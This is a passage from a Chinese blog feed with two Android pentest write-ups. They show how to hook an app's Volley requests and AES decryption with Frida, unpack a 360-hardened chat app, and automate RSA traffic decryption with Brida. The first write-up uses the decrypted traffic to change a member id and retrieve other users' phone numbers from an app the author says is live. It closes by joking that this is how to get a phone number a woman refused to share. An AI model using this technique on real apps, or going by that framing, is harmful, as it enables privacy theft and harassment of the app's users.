class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Throwable</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String<span class="token punctuation">.</span>Bytes</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">xxxxx<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span>SecurityUtil</span><span class="token punctuation">.</span><span class="token function">aesDecrypt</span><span class="token punctuation">(</span><span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">xxxxx<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span>SecurityUtil</span><span class="token punctuation">.</span><span class="token function">aesDecrypt</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>        at xxxxx<span class="token punctuation">.</span>l<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">parseNetworkResponse</span><span class="token punctuation">(</span><span class="token class-name">KnowAsynHttpRequestDefEncrypt</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">17</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre></li>我们发现了一堆com.android.volley.toolbox 名字猜测有可能是发包用的 百度搜索一下<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161136052.png" alt="果然是发包的"><br>随便搜索一个看看内置框架没办法看源码于是看看包有什么特点发现这里Port&#x3D;PhoneLogin&amp;CheckCode&#x3D;0000000000;6.08.2.0;android;0;0 不变搜索一波<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161142613.png" alt="瞬间柳暗花明"><br>随便点一个函数。看到super 一看继承StringRequest点一下看看发现点不动。看看这包名。import com.android.volley.toolbox.StringRequest;<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161143500.png" alt="突破点"><br>百度一下import com.android.volley.toolbox.StringRequest; 如何发包不就行了<a href="https://blog.csdn.net/nuli888/article/details/52169679">https://blog.csdn.net/nuli888/article/details/52169679</a></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">*</span> <span class="token annotation punctuation">@param</span> path   请求路径     <span class="token operator">*</span> <span class="token annotation punctuation">@param</span> map    请求参数     <span class="token operator">*</span> <span class="token annotation punctuation">@param</span> entity 需要解析的类     <span class="token operator">*</span> <span class="token annotation punctuation">@return</span>     <span class="token operator">*</span><span class="token operator">/</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">StringRequest_POST</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Handler</span> handler<span class="token punctuation">,</span> <span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> map<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> entity<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token operator">*</span> get请求     <span class="token operator">*</span>     <span class="token operator">*</span> <span class="token annotation punctuation">@param</span> path   请求路径     <span class="token operator">*</span> <span class="token annotation punctuation">@param</span> entity 需要解析的类     <span class="token operator">*</span> <span class="token annotation punctuation">@return</span>     <span class="token operator">*</span><span class="token operator">/</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">StringRequest_GET</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Handler</span> handler<span class="token punctuation">,</span> <span class="token class-name">String</span> path<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> entity<span class="token punctuation">)</span> 调用<span class="token class-name">StringRequest</span> request_post <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringRequest</span><span class="token punctuation">(</span><span class="token class-name">Request<span class="token punctuation">.</span>Method</span><span class="token punctuation">.</span>POST<span class="token punctuation">,</span>                path<span class="token punctuation">,</span> succes<span class="token punctuation">,</span> error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></code></pre><p>可以看出第二个参数是请求url ，如果是post第三个是参数的key 和value</p></ul><h2 id="编写frida-hook脚本"><a href="#编写frida-hook脚本" class="headerlink" title="编写frida hook脚本"></a>编写frida hook脚本</h2><ul><li>frida编写脚本提示信息</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161154809.png"></p><pre class="language-python" data-language="python"><code class="language-python">Error<span class="token punctuation">:</span> StringRequest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> has more than one overload<span class="token punctuation">,</span> use <span class="token punctuation">.</span>overload<span class="token punctuation">(</span><span class="token operator">&lt;</span>signature<span class="token operator">></span><span class="token punctuation">)</span> to choose <span class="token keyword">from</span><span class="token punctuation">:</span>        <span class="token punctuation">.</span>overload<span class="token punctuation">(</span><span class="token string">'java.lang.String'</span><span class="token punctuation">,</span> <span class="token string">'com.android.volley.Response$Listener'</span><span class="token punctuation">,</span> <span class="token string">'com.android.volley.Response$ErrorListener'</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span>overload<span class="token punctuation">(</span><span class="token string">'int'</span><span class="token punctuation">,</span> <span class="token string">'java.lang.String'</span><span class="token punctuation">,</span> <span class="token string">'com.android.volley.Response$Listener'</span><span class="token punctuation">,</span> <span class="token string">'com.android.volley.Response$ErrorListener'</span><span class="token punctuation">)</span>    at X <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>lib<span class="token operator">/</span><span class="token keyword">class</span><span class="token operator">-</span>factory<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">563</span><span class="token punctuation">)</span>    at K <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>lib<span class="token operator">/</span><span class="token keyword">class</span><span class="token operator">-</span>factory<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">558</span><span class="token punctuation">)</span>    at <span class="token builtin">set</span> <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>lib<span class="token operator">/</span><span class="token keyword">class</span><span class="token operator">-</span>factory<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">926</span><span class="token punctuation">)</span>    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span><span class="token operator">/</span>stringRequest<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">)</span>    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>lib<span class="token operator">/</span>vm<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">)</span>    at _performPendingVmOps <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>index<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">238</span><span class="token punctuation">)</span>    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>index<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">213</span><span class="token punctuation">)</span>    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span> <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>lib<span class="token operator">/</span>vm<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">)</span>    at _performPendingVmOpsWhenReady <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>index<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">232</span><span class="token punctuation">)</span>    at perform <span class="token punctuation">(</span>frida<span class="token operator">/</span>node_modules<span class="token operator">/</span>frida<span class="token operator">-</span>java<span class="token operator">-</span>bridge<span class="token operator">/</span>index<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">192</span><span class="token punctuation">)</span>    at <span class="token operator">&lt;</span><span class="token builtin">eval</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token operator">/</span>stringRequest<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">)</span></code></pre><p>看这个比较像 ‘int’, ‘java.lang.String hook一下  这样我们可以获取到任意url,至于请求数据的话直接获取密钥解密就完事了。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161443194.png" alt="说明没有问题"><br>搜索一下解密的内容直接定位<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161501655.png" alt="组包关键函数"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161458220.png" alt="解密内容"></p><p>这会儿请求的url有了返回的直接hook aes解密算法就行了。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161512794.png" alt="脚本"></p></ul><h2 id="使用脚本分析登陆以后的操作"><a href="#使用脚本分析登陆以后的操作" class="headerlink" title="使用脚本分析登陆以后的操作"></a>使用脚本分析登陆以后的操作</h2><ul>下图显示登陆成功了返回的数据。<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161516834.png" alt="脚本运行截图"></p><li> 看个登陆以后返回什么在看个人信息那里明文请求是什么</li>登陆画红框的memberid就是登陆者的id好 portpassword 是动态aes的秘钥<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161520160.png" alt="登陆返回"></p><p>在看个人信息那分析包以后用hook方式发现用的是AES&#x2F;ECB&#x2F;PKCS5Padding  采用的动态秘钥方式 登陆成功以后给你一个动态key。所有请求用这个key进行加密响应也是用这个进行解密。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161613870.png" alt="直接用秘钥解密请求成功解密"></p></ul><h2 id="配置bp插件autodecoder测试"><a href="#配置bp插件autodecoder测试" class="headerlink" title="配置bp插件autodecoder测试"></a>配置bp插件autodecoder测试</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161630479.png" alt="autodecoder配置"><br>Charles 转发请求到bp,直接修改id就可以获取到铭感信息<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161640801.png" alt="信息一"><br>手机号信息,至此此app只要绑定手机号只要知道对方id号就可以获取手机号码<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161641386.png" alt="信息二"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>此app采用的动态秘钥方式 登陆成功以后给你一个动态key。AES&#x2F;ECB&#x2F;PKCS5Padding 所有请求用这个key进行加密响应也是用这个进行解密。关注频道后续还会带来精彩的实战内容。和小姐姐聊天不给手机号怎么办搞他(前提是有漏洞哈哈哈)</p>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> PenetrationTest </tag>
            
            <tag> autoDecoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓自动化渗透测试工具Brida-实战演示某聊天app</title>
      <link href="/androidreverse/2023/03/articles/4a73c3959963b967/"/>
      <url>/androidreverse/2023/03/articles/4a73c3959963b967/</url>
      
        <content type="html"><![CDATA[<h2 id="Brida介绍"><a href="#Brida介绍" class="headerlink" title="Brida介绍"></a>Brida介绍</h2><ul><li>官方解释:Brida 是 Burp Suite 扩展，它作为 Burp Suite 和 Frida 之间的桥梁，可以在篡改应用程序与后端服务/服务器之间交换的流量的同时使用和操作应用程序自己的方法。它支持 Frida 支持的所有平台（Windows、macOS、Linux、iOS、Android 和 QNX）。<br/>https://github.com/federicodotta/Brida <br/>https://github.com/vichhika/Brida  <br/><p>自己理解:brida 可以直接和frida server配合 。brida通过frida server对app进行spwn或者attach。将brida的js脚本通过frida-server注入app内。然后通过RPC主动调用方式对请求明文进行自动加密或者自动解密。发送到服务器上。服务器收到请求。解密然后响应方式加密数据发送给brida。brida 通过主动调用接收直接对加密数据进行解密。从而达到自动化测试的目的。</p></li></ul><h2 id="Brida环境安装"><a href="#Brida环境安装" class="headerlink" title="Brida环境安装"></a>Brida环境安装</h2><ul><li>安装的环境参考https://www.bilibili.com/video/av332313470/   不在过多介绍。这里我用的python环境是python3</li></ul><h2 id="app进行分析"><a href="#app进行分析" class="headerlink" title="app进行分析"></a>app进行分析</h2><ul><li>使用jadx进行反编看看这个apk</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032006200.png" alt="看到qihoo绝对360加固"></p><li>360加固应该是整体加固。</li><li>脱整体加固的工具有frida-dexdump(python编写可以单独使用可以配合objection),blackDex(就是一个app直接安装就行了)。等工具我觉得这个两个工具最好用。工具百度或者github去搜索</li><li>这里我使用blackDex进行脱壳</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032014948.png" alt="选择目标app点击进行脱壳"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032014057.png" alt="脱壳成功"></p><li>利用adb pull命令拉下来。把打包的dex文件压缩成zip文件然后放到jadx里面即可</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032017012.png" alt="脱壳成功导入jdax里面"></p><li>接下来打开postern和Charles对软件进行抓包</li><li>刚打开手机发现提示root,我们通过截图可以看到是toast方法这是一个定位点</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032021125.png" alt="截图反应是toast标识"></p><li>然后我们点击账号登陆随便输入进行抓包。这个没有检测代理也没有检测vpn可以直接抓并且是http协议所以不存在什么证书双向验证等问题。开搞</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032026906.png" alt="划红色的就是我们的目标"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032028542.png" alt="请求和响应都加密"></p><li>我们看到有一个param=我们去源代码里面搜素一下发现都是关联的d.c.a.k.r.c 函数</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032033658.png" alt="搜素到不少"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032035608.png" alt="这个uc函数估计是就是加密解密逻辑"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303032037359.png" alt="确定加密解密函数"></p><li>看代码是RSA的加密方式不过他这和普通的好像不太一样有一个b函数实现加密解密逻辑</li><li>核心加密算法代码如下:</li><li><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">d<span class="token punctuation">.</span>c<span class="token punctuation">.</span>a<span class="token punctuation">.</span>k</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">KeyFactory</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">NoSuchAlgorithmException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>interfaces<span class="token punctuation">.</span></span><span class="token class-name">RSAPublicKey</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span><span class="token class-name">InvalidKeySpecException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span><span class="token class-name">X509EncodedKeySpec</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span><span class="token class-name">Cipher</span><span class="token punctuation">;</span><span class="token comment">/* compiled from: U.java */</span><span class="token comment">/* loaded from: dex_.dex */</span><span class="token keyword">public</span> <span class="token keyword">class</span> u <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">RSAPublicKey</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchAlgorithmException</span><span class="token punctuation">,</span> <span class="token class-name">InvalidKeySpecException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">RSAPublicKey</span><span class="token punctuation">)</span> <span class="token class-name">KeyFactory</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">generatePublic</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">X509EncodedKeySpec</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Cipher</span> cipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA/ECB/PKCS1Padding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">RSAPublicKey</span> a2 <span class="token operator">=</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token function">d</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> a2<span class="token punctuation">.</span><span class="token function">getModulus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bitLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> unused<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            m<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token string">"解密字符串["</span> <span class="token operator">+</span> str <span class="token operator">+</span> <span class="token string">"]时遇到异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* JADX INFO: Access modifiers changed from: package-private */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">c</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Cipher</span> cipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"RSA/ECB/PKCS1Padding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">RSAPublicKey</span> a2 <span class="token operator">=</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"xxxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span><span class="token function">d</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> str<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> a2<span class="token punctuation">.</span><span class="token function">getModulus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bitLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e2<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            m<span class="token punctuation">.</span><span class="token function">b</span><span class="token punctuation">(</span><span class="token string">"加密字符串["</span> <span class="token operator">+</span> str <span class="token operator">+</span> <span class="token string">"]时遇到异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">d</span><span class="token punctuation">(</span><span class="token class-name">Cipher</span> cipher<span class="token punctuation">,</span> <span class="token keyword">int</span> i2<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bArr<span class="token punctuation">,</span> <span class="token keyword">int</span> i3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          核心算法 由于该app目前在运行阶段所以核心代码我就忽略了。           <span class="token keyword">return</span> byteArray<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li>仔细看加解密使用的都是同一个公钥。公钥我们用xxx进行代替。这种我是第一次见笑脸。</li></ul><h2 id="Frida-Hook脚本编写确定猜想"><a href="#Frida-Hook脚本编写确定猜想" class="headerlink" title="Frida Hook脚本编写确定猜想"></a>Frida Hook脚本编写确定猜想</h2><ul><li>编写frida脚本需要frida api基础java和JavaScript基础如果不懂建议去学习。这里不再讲述</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041430875.png" alt="firdahook脚本编写"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041433635.png" alt="hook效果说明脚本编写没有问题"></p><h2 id="使用博主编写算法通杀脚本快速定位"><a href="#使用博主编写算法通杀脚本快速定位" class="headerlink" title="使用博主编写算法通杀脚本快速定位"></a>使用博主编写算法通杀脚本快速定位</h2><ul><li>可以去频道下载(这个只能吐出明文并不能定位),直接定位的后续内部发布</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041701386.png" alt="通杀算法快速定位1"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041702117.png" alt="通杀算法快速定位2"></p><h2 id="app加密通信过程"><a href="#app加密通信过程" class="headerlink" title="app加密通信过程"></a>app加密通信过程</h2><ul><li>1:app明文请求通过RSA/ECB/PKCS1Padding 非对称算法对明文请求加密</li><li>2:服务器收到加密请求使用秘钥对加密请求进行解密(注意这里public static String b) 对请求加密的数据无法解密因为是非对称的加密算法</li><li>3:把解密的数据在服务器里面顺序执行判断等。结果在加密然后发送(响应)给app客户端。</li><li>4:app客户端收到加密响应用自己的解密算法对响应进行解密</li></ul><h2 id="frida和brida和burp与app和服务器的关系解读"><a href="#frida和brida和burp与app和服务器的关系解读" class="headerlink" title="frida和brida和burp与app和服务器的关系解读"></a>frida和brida和burp与app和服务器的关系解读</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041459326.png" alt="图解说明关系"></p><h2 id="brida-主动调用js编写"><a href="#brida-主动调用js编写" class="headerlink" title="brida 主动调用js编写"></a>brida 主动调用js编写</h2><ul><li>编写frida脚本需要frida api基础java和JavaScript基础 Brida 编写脚本的基础 如果不懂建议去学习。这里不再讲述</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041502303.png" alt="brida Rpc脚本编写"></p><ul><li>测试是否生效</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041505150.png" alt="测试截图"></p><h2 id="brida-主动调用插件编写"><a href="#brida-主动调用插件编写" class="headerlink" title="brida 主动调用插件编写"></a>brida 主动调用插件编写</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041515403.png" alt="加密插件"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041518543.png" alt="解密插件"></p><h2 id="最终测试截图"><a href="#最终测试截图" class="headerlink" 